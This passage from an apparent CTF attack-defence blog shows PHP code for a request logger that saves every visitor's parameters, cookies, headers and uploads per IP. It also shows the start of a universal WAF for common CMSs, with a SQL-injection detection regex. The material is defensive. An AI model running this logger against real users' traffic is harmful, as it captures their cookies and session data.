&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;function_exists&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;getallheaders&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt; 
&lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function-definition function&#34;&gt;getallheaders&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;// 获取所有的头信息&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;foreach&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_SERVER&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$name&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&gt;&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$value&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;// 循环获取所有的头信息&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;substr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$name&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;HTTP_&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; 
&lt;span class=&#34;token variable&#34;&gt;$headers&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;str_replace&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39; &#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;-&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;ucwords&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;strtolower&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;str_replace&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;_&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39; &#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;substr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$name&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$value&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;// 将头信息的名称替换为小写，并将下划线替换为空格&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt; 
&lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$headers&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; 
&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt; 
&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt; 
&lt;span class=&#34;token variable&#34;&gt;$get&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;// 获取 get 参数 &lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$post&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;// 获取 post 参数&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$cookie&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$_COOKIE&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;// 获取 cookie 参数&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$header&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;getallheaders&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;// 获取所有的头信息&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$files&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$_FILES&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;// 获取所有的上传文件信息&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$ip&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$_SERVER&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;REMOTE_ADDR&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;// 获取客户端 ip&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$method&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$_SERVER&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;REQUEST_METHOD&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;// 获取请求方式&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$filepath&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$_SERVER&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;SCRIPT_NAME&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;// 获取文件路径&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;foreach&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_FILES&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$key&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&gt;&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$value&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;// 循环获取所有的上传文件信息&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$files&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$key&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;content&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;file_get_contents&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_FILES&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$key&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;tmp_name&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;// 获取文件内容&lt;/span&gt;
&lt;span class=&#34;token function&#34;&gt;file_put_contents&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_FILES&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$key&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;tmp_name&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;virink&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;// 写入文件&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;

&lt;span class=&#34;token keyword&#34;&gt;unset&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$header&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;Accept&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;// 删除头信息中的 Accept&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$input&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;Get&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&gt;&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$get&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;Post&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&gt;&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$post&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;Cookie&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&gt;&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$cookie&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;File&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&gt;&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$files&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;Header&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&gt;&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$header&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;// 将所有的参数合并成一个数组&lt;/span&gt;

&lt;span class=&#34;token function&#34;&gt;logging&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$input&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;// 调用日志函数&lt;/span&gt;

&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;

&lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function-definition function&#34;&gt;logging&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$var&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;// 日志函数&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$filename&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$_SERVER&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;REMOTE_ADDR&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;// 获取客户端 ip&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$LOG_FILENAME&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token constant&#34;&gt;LOG_FILEDIR&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;/&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$filename&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;// 日志文件路径&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$time&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;date&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;Y-m-d G:i:s&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;// 获取当前时间&lt;/span&gt;
&lt;span class=&#34;token function&#34;&gt;file_put_contents&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$LOG_FILENAME&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;\r\n&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$time&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;\r\n&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;print_r&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$var&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token constant boolean&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token constant&#34;&gt;FILE_APPEND&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;// 写入日志文件&lt;/span&gt;

&lt;span class=&#34;token function&#34;&gt;file_put_contents&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$LOG_FILENAME&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;\r\n&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;http://&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_SERVER&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;HTTP_HOST&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_SERVER&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;PHP_SELF&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;?&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_SERVER&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;QUERY_STRING&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token constant&#34;&gt;FILE_APPEND&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;// 写入日志文件&lt;/span&gt;

&lt;span class=&#34;token function&#34;&gt;file_put_contents&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$LOG_FILENAME&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;\r\n***************************************************************&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token constant&#34;&gt;FILE_APPEND&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;// 写入日志文件&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;

&lt;span class=&#34;token function&#34;&gt;waf&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; 
&lt;span class=&#34;token delimiter important&#34;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
&lt;p&gt;如果可以我们还可以上通防（一般都是不行）&lt;/p&gt;
&lt;p&gt;&lt;pre class=&#34;line-numbers language-php&#34; data-language=&#34;php&#34;&gt;&lt;code class=&#34;language-php&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;&amp;lt;!-- 
require_once(&#39;waf.php&#39;)

PHPCMS V9 \phpcms\base.php
PHPWIND8.7 \data\sql_config.php
DEDECMS5.7 \data\common.inc.php
DiscuzX2   \config\config_global.php
Wordpress   \wp-config.php
Metinfo   \include\head.php
--&gt;&lt;/span&gt;

&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;

&lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function-definition function&#34;&gt;customError&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$errno&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$errstr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$errfile&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$errline&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;
	&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;&amp;lt;b&gt;Error number:&amp;lt;/b&gt; [&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token variable&#34;&gt;$errno&lt;/span&gt;&lt;/span&gt;],error on line &lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token variable&#34;&gt;$errline&lt;/span&gt;&lt;/span&gt; in &lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token variable&#34;&gt;$errfile&lt;/span&gt;&lt;/span&gt;&amp;lt;br /&gt;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
	&lt;span class=&#34;token keyword&#34;&gt;die&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;

&lt;span class=&#34;token function&#34;&gt;set_error_handler&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;customError&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token constant&#34;&gt;E_ERROR&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$getfilter&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;&#39;|(and|or)\\b.+?(&gt;|&amp;lt;|=|in|like)|\\/\\*.+?\\*\\/|&amp;lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
